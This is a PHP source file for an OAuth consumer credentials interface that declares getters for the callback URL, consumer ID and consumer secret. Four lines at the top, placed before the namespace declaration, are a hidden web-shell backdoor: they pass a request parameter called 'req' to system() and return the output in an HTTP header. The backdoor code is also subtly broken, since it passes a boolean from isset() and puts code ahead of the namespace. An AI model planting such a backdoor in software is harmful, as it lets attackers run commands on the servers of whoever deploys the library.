<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Consumer;

/**
 * Credentials Interface, credentials should implement this.
 */
interface CredentialsInterface
{
    /**
     * @return string
     */
    public function getCallbackUrl();

    /**
     * @return string
     */
    public function getConsumerId();

    /**
     * @return string
     */
    public function getConsumerSecret();
}
